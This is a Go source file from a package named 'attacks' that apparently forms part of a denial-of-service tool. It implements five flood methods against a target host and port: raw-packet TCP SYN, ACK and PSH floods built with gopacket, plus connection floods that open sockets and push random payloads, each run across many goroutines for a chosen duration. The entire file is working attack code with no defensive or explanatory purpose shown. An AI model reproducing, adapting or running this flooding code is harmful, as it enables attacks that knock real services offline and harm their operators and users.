package attacks

import (
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"log"
	"math/rand"
	"net"
	"strconv"
	"time"
)

type TCPHandshake struct {
}
type TCPAck struct {
}
type TCPSyn struct {
}
type TCPPsh struct {
}
type TCPHold struct {
}

func (p TCPPsh) Name() string {
	return "psh"
}

func (p TCPPsh) Send(host string, port int, seconds int, size int, threads int) {
	for i := 0; i < threads; i++ {
		go func() {
			if port == 0 {
				port = randInt(1, 65535)
			}
			netIp := net.ParseIP(host)
			srcip, _ := localIPPort(netIp)
			payload := make([]byte, size)
			rand.Read(payload)
			endAt := time.Now().Add(time.Second * time.Duration(seconds))
			ipHeader := &layers.IPv4{
				SrcIP:    srcip,
				DstIP:    netIp,
				Protocol: layers.IPProtocolTCP,
			}
			// Our TCP header
			tcp := &layers.TCP{
				SrcPort: layers.TCPPort(randInt(10000, 65535)),
				DstPort: layers.TCPPort(port),
				Seq:     1105024978,
				PSH:     true,
				Window:  14600,
			}
			tcp.SetNetworkLayerForChecksum(ipHeader)
			buf := gopacket.NewSerializeBuffer()
			opts := gopacket.SerializeOptions{
				ComputeChecksums: true,
				FixLengths:       true,
			}
			if err := gopacket.SerializeLayers(buf, opts, tcp, gopacket.Payload(payload)); err != nil {
				log.Fatal(err)
			}
			bytes := buf.Bytes()
			for time.Now().Before(endAt) {
				sendProtoPacket(netIp, "tcp", bytes)
			}
		}()
	}
}

func (p TCPPsh) Stop(host string, port int) {
	//TODO implement me
	panic("implement me")
}

func (s TCPSyn) Name() string {
	return "syn"
}

func (s TCPSyn) Send(host string, port int, seconds int, size int, threads int) {
	for i := 0; i < threads; i++ {
		go func() {
			if port == 0 {
				port = randInt(1, 65535)
			}
			netIp := net.ParseIP(host)
			srcip, _ := localIPPort(netIp)
			payload := make([]byte, size)
			rand.Read(payload)
			endAt := time.Now().Add(time.Second * time.Duration(seconds))
			ipHeader := &layers.IPv4{
				SrcIP:    srcip,
				DstIP:    netIp,
				Protocol: layers.IPProtocolTCP,
			}
			// Our TCP header
			tcp := &layers.TCP{
				SrcPort: layers.TCPPort(randInt(10000, 65535)),
				DstPort: layers.TCPPort(port),
				Seq:     1105024978,
				SYN:     true,
				Window:  14600,
			}
			tcp.SetNetworkLayerForChecksum(ipHeader)
			buf := gopacket.NewSerializeBuffer()
			opts := gopacket.SerializeOptions{
				ComputeChecksums: true,
				FixLengths:       true,
			}
			if err := gopacket.SerializeLayers(buf, opts, tcp, gopacket.Payload(payload)); err != nil {
				log.Fatal(err)
			}
			bytes := buf.Bytes()
			for time.Now().Before(endAt) {
				sendProtoPacket(netIp, "tcp", bytes)
			}
		}()
	}
}

func (s TCPSyn) Stop(host string, port int) {
	//TODO implement me
	panic("implement me")
}

func (a TCPAck) Name() string {
	return "ack"
}

func (a TCPAck) Send(host string, port int, seconds int, size int, threads int) {
	for i := 0; i < threads; i++ {
		go func() {
			if port == 0 {
				port = randInt(1, 65535)
			}
			netIp := net.ParseIP(host)
			srcip, _ := localIPPort(netIp)
			payload := make([]byte, size)
			rand.Read(payload)
			endAt := time.Now().Add(time.Second * time.Duration(seconds))
			ipHeader := &layers.IPv4{
				SrcIP:    srcip,
				DstIP:    netIp,
				Protocol: layers.IPProtocolTCP,
			}
			// Our TCP header
			tcp := &layers.TCP{
				SrcPort: layers.TCPPort(randInt(10000, 65535)),
				DstPort: layers.TCPPort(port),
				Seq:     1105024978,
				ACK:     true,
				Window:  14600,
			}
			tcp.SetNetworkLayerForChecksum(ipHeader)
			buf := gopacket.NewSerializeBuffer()
			opts := gopacket.SerializeOptions{
				ComputeChecksums: true,
				FixLengths:       true,
			}
			if err := gopacket.SerializeLayers(buf, opts, tcp, gopacket.Payload(payload)); err != nil {
				log.Fatal(err)
			}
			bytes := buf.Bytes()
			for time.Now().Before(endAt) {
				sendProtoPacket(netIp, "tcp", bytes)
			}
		}()
	}
}

func (a TCPAck) Stop(host string, port int) {
	//TODO implement me
	panic("implement me")
}

func (h TCPHandshake) Name() string {
	return "handshake"
}

func (h TCPHandshake) Send(host string, port int, seconds int, size int, threads int) {
	for i := 0; i < threads; i++ {
		go func() {
			if port == 0 {
				port = randInt(1, 65535)
			}
			payload := make([]byte, size)
			rand.Read(payload)
			endAt := time.Now().Add(time.Second * time.Duration(seconds))
			for time.Now().Before(endAt) {
				conn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
				if err != nil {
					fmt.Println(err)
					continue
				}
				for time.Now().Before(endAt) {
					_, err := conn.Write(payload)
					if err != nil {
						break
					}
				}
			}
		}()
	}
}
func (h TCPHandshake) Stop(host string, port int) {
	//TODO implement me
	panic("implement me")
}
func (h TCPHold) Name() string {
	return "hold"
}

func (h TCPHold) Send(host string, port int, seconds int, size int, threads int) {
	for i := 0; i < threads; i++ {
		go func() {
			if port == 0 {
				port = randInt(1, 65535)
			}
			time.Sleep(time.Duration(i) * 7)
			payload := make([]byte, size)
			rand.Read(payload)
			endAt := time.Now().Add(time.Second * time.Duration(seconds))
			for time.Now().Before(endAt) {
				conn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
				if err != nil {
					fmt.Println(err)
					continue
				}
				conn.Write(payload)
				time.Sleep(time.Second * 1)
				conn.Close()
			}
		}()
	}
}
func (h TCPHold) Stop(host string, port int) {
	//TODO implement me
	panic("implement me")
}
